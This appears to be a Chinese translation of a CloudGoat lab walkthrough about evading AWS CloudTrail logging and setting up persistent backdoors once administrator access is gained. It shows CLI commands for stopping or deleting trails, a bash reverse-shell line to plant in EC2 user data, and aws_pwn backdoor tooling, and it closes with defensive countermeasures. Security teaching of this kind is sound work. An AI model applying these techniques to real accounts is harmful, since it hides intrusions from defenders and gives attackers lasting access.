> 原文链接: https://www.anquanke.com//post/id/170618 


# CloudGoat云靶机 Part-2：绕过CloudTrail实现持久访问


                                阅读量   
                                **137601**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者rzepsky，文章来源：medium.com
                                <br>原文地址：[https://medium.com/@rzepsky/playing-with-cloudgoat-part-2-fooling-cloudtrail-and-getting-persistence-access-6a1257bb3f7c](https://medium.com/@rzepsky/playing-with-cloudgoat-part-2-fooling-cloudtrail-and-getting-persistence-access-6a1257bb3f7c)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/dm/1024_575_/t01e57150d9f8db6936.jpg)](https://p0.ssl.qhimg.com/dm/1024_575_/t01e57150d9f8db6936.jpg)

在第一篇文章中，我分享了一个AWS提权实例：从一个仅有EC2权限的账户提权至管理员权限。今天，我将继续本系列，向大家展示如何绕过监控系统和如何实现持久访问。

[![](https://p4.ssl.qhimg.com/t0145bef55af8d19934.png)](https://p4.ssl.qhimg.com/t0145bef55af8d19934.png)

## CloudTrail

CloudTrail服务会监控所有的AWS活动。亚马逊是这样介绍它的：

> “AWS CloudTrail 是一项 AWS 服务，可帮助对您的 AWS 账户进行监管、合规性检查、操作审核和风险审核。用户、角色或 AWS 服务执行的操作将记录为 CloudTrail 中的事件。事件包括在 AWS 管理控制台、AWS Command Line Interface 和 AWS 开发工具包和 API 中执行的操作。简化了安全性分析，资源更改检测，故障排除等过程。”

换句话说，CloudTrail是个“老大哥”，监视着用户的所有行为。很显然，攻击者拿下一个脆弱的环境后，第一件事就是绕过检测系统，清除痕迹。如果攻击者拿下了管理员权限，实现这些并不是不可能的。

### <a class="reference-link" name="%E4%BA%86%E8%A7%A3%E9%85%8D%E7%BD%AE"></a>了解配置

CloudTrail服务默认是关闭的，管理员可以配置它。你可以设置“trails”来自定义监视的内容。

回到CloudGoat平台，让我们来看看CloudTrail监视的范围。

[![](https://p4.ssl.qhimg.com/t018ff4c22a2ba6c98d.png)](https://p4.ssl.qhimg.com/t018ff4c22a2ba6c98d.png)

可以看到，所有的日志文件都存储在一个名为“8678170722044418295491212493322823229141751439696325418”的S3储存桶中。还有CloudGoat中的CloudTrail仅监视了“us-west-2”区域。所以我们可以开展区域外的行动了，比如我们创建在其他区域创建一个新实例，这并不会被CloudTrail监控到。还有一点，请注意，使用全球服务将会被记录下来，像“IAM”（比如创建一个备用账户）。那么，攻击者如何绕过CloudTrail监控服务？

### <a class="reference-link" name="%E4%B8%AD%E6%AD%A2%E6%9C%8D%E5%8A%A1"></a>中止服务

首先，所有的入侵者都会想到这点。暂停服务用以下简单的命令实现：

[![](https://p2.ssl.qhimg.com/t01a400cf4582cb8735.png)](https://p2.ssl.qhimg.com/t01a400cf4582cb8735.png)

然后，攻击者可能会执行一些有害操作（例如窃取数据，创建IAM备用账户，创建新实例用于挖矿）。完成攻击后，可以以下命令启动CloudTrail：

```
$ aws cloudtrail start-logging --name cloudgoat_trail --profile administrator
```

### <a class="reference-link" name="%E5%88%A0%E9%99%A4trails"></a>删除trails

通过删除所有trail也可以中止CloudTrail服务：

```
$ aws cloudtrail delete-trail --name cloudgoat_trail --profile administrator
```

或者，你移除存储日志信息的储存桶也可以做到（你过你那么做，记住添加一个`force`标签，否则你即使有管理员权限也无法删除储存桶）

[![](https://p1.ssl.qhimg.com/t01779068adf19a1add.png)](https://p1.ssl.qhimg.com/t01779068adf19a1add.png)

在删除trails或者储存桶后，CloudTrail将处于宕机状态。还有一点，这两个方法有点高调，因为CloudTrail中会有最终的回显。例如当你删除了储存桶后，CloudTrail会有这样的提示：

[![](https://p2.ssl.qhimg.com/t016646da88de30815e.png)](https://p2.ssl.qhimg.com/t016646da88de30815e.png)

GuardDuty（另一个监控服务）也会对CloudTrail服务的异常状态发出警报：

[![](https://p4.ssl.qhimg.com/t012a03c16201be6f8e.png)](https://p4.ssl.qhimg.com/t012a03c16201be6f8e.png)

### <a class="reference-link" name="%E6%9B%B4%E5%A5%BD%E7%9A%84%E6%96%B9%E6%B3%95"></a>更好的方法

如果开启了CloudTrail，它默认监视所有区域。然而我们的CloudGoat平台中仅监视“us-west-2” 区域，所以我们可以在其他区域创建EC2实例，而不用担心被监控到。

对于全球服务，前面已经说过了，任何操作都会被监控到。幸运的是，你可以用标签`include-global-service-events`关闭全球服务中的事件监视。为了验证是否有效，我创建了一个用户“test1”，然后关闭了全球服务事件监视:

[![](https://p2.ssl.qhimg.com/t01338d5db4931bd576.png)](https://p2.ssl.qhimg.com/t01338d5db4931bd576.png)

然后我创建了用户“test2”:

[![](https://p5.ssl.qhimg.com/t01003ef9d4916b613d.png)](https://p5.ssl.qhimg.com/t01003ef9d4916b613d.png)

我用Bob的密钥暂停了EC2实例（检查“us-west-2”的所有事件是否正确记录）。在CloudTrail中，可以看到这里有记录”test1“用户的创建，而没有”test2“的记录：

[![](https://p1.ssl.qhimg.com/t01f5be7fc688e42d1b.png)](https://p1.ssl.qhimg.com/t01f5be7fc688e42d1b.png)

用这种方法，攻击者可以绕过CloudTrail服务的监视。还有其他的方法避免被CloudTrail记录：
1. 使用新密钥加密所有日志（禁用该密钥，一段时间后删除）
1. 使用新的S3储存桶（攻击者完成删除它，然后再换回原先的储存桶）。
1. 使用AWS Lambda拒绝新日志记录（不需要更改CloudTrail的trails配置，你只需要这些权限“iam:CreatePolicy”, “iam:AttachRolePolicy”, “lambda:CreateFunction”, “lambda:AddPermission”, “s3:PutBucketNotification”）
如果这些方法不切合实际情况，[Daniel Grzelak的一篇文章](https://danielgrzelak.com/disrupting-aws-logging-a42e437d6594)可能会帮到你。

> 需要注意的是，以上所有方法虽然可以避免CloudTrail日志被记录到储存桶中，但是****所有的操作还是会CloudTrail事件系统储存90天****。包括所有区域的事件都会被储存且无法关闭存储系统。[这里](https://summitroute.com/blog/2018/08/07/aws_cloudtrail_vs_cloudwatch_events_vs_event_history/)你可以了解详情。

[![](https://p0.ssl.qhimg.com/t01df11d4705afbbf85.png)](https://p0.ssl.qhimg.com/t01df11d4705afbbf85.png)



## 持久访问

在获取管理员权限，并且知道如何绕过CloudTrail监视器后，那么是时候在该环境实现持久访问了。有很多方法可以在该环境下留下后门，比如：
1. 用高权限账户修改用户数据（使用bash命令`bash -i &gt;&amp; /dev/tcp/[your_ip]/[your_port] 0&gt;&amp;1`或者获取SSH密钥认证）
1. 添加AMI备用账户后，用它创建新EC2实例
1. 在Lambda函数中添加后门（比如，某个参数调用该函数后导致创建一个新用户）
较好的方法是给现有的用户分配额外的密钥，[aws pwn](https://github.com/dagrz/aws_pwn)可以帮助你做到这点。然而aws pwn还可以帮助你自动化地完成很多事：
<li>
****rabbit_lambda****—  Lambda函数，可以不断地删除某个用户再创建它，实现干扰删除用户的事件记录系统。</li>
<li>
****cli_lambda**** —  Lanmbda函数，可以无需凭证创建AWS CLI代理</li>
<li>
****backdoor_created_users_lambda**** — Lambda函数，可以给新用户添加密钥</li>
<li>
****backdoor_created_roles_lambda**** — Lambda函数，给新用户之间添加信任关系</li>
<li>
****backdoor_created_security_groups_lambda****— Lambda函数，把新入站规则应用到所有安全组</li>
<li>
****backdoor_all_users****— 可以给账户中的用户添加密钥</li>
<li>
****backdoor_all_roles**** — 可以给所有用户之间添加信任关系（设置[ARN](https://docs.aws.amazon.com/zh_cn/general/latest/gr/aws-arns-and-namespaces.html)）</li>
让我们回到CloudGoat平台环境，给所有用户添加密钥：

[![](https://p2.ssl.qhimg.com/t01a61429b8e3499060.png)](https://p2.ssl.qhimg.com/t01a61429b8e3499060.png)

好的，现在所有用户都有两个密钥了。我们可以再AWS管理中心看到：

[![](https://p0.ssl.qhimg.com/t01892c387b2ac1ed0d.png)](https://p0.ssl.qhimg.com/t01892c387b2ac1ed0d.png)

有趣的是，用户不会收到添加密钥的通知。对于CloudTrail来说，因为关闭了全球服务事件的通知，所以不会有日志记录。那么，GuardDuty（AWS监控系统）会有什么不同？

> <p>Amazon是这样描述GuardDuty服务的“<br>
Amazon GuardDuty 是一种智能威胁检测服务，帮助保护您的 AWS 账户和工作负载。”</p>

所以，它不会把有权限地IAM用户正常创建新密钥识别为异常活动：

[![](https://p0.ssl.qhimg.com/t01c4f8a97fa4e5a1ed.png)](https://p0.ssl.qhimg.com/t01c4f8a97fa4e5a1ed.png)



## 应对措施

这篇文章介绍了绕过CloudTrail监视系统和如何实现持久访问。你应该发现了，这不是一项艰巨的任务。那么，我们该如何防止这些东西发生呢？
1. 启用[CloudTrail日志完整性保护](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-validation-intro.html)，以防止攻击者替换日志的S3储存桶。
1. 除了极少数需要使用它的用户（遵循最小权限原则，[Netflix的Repokid](https://github.com/Netflix/repokid)可以快速地帮助你），删除所有用户的CloudTrail管理权限（有助于防止攻击者提权，[这里](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)可以帮助你）
1. 设置其他AWS账户管理CloudTrail S3储存桶的[跨区域复制](https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/dev/crr.html)权限。即使主账户的AWS环境被攻击者入侵，CloudTrail日志也无法更改。
1. 启用[MFA删除保护](https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/dev/UsingMFADelete.html)，增加了删除储存桶内容的难度。
1. 使用其他公司的服务备份CloudTrail日志（例如：[ Splunk](https://aws.amazon.com/cloudtrail/partners/splunk/)）。
1. 启用多种监视器，比如[AWS AWS CloudWatch Events](https://docs.aws.amazon.com/zh_cn/AmazonCloudWatch/latest/events/WhatIsCloudWatchEvents.html), 外部服务：[Cloudsploit Events](https://blog.cloudsploit.com/introducing-cloudsploit-events-fb2b4822130a) , [CloudTrail Listener](https://www.gorillastack.com/aws-cloudtrail-slack-integration/)。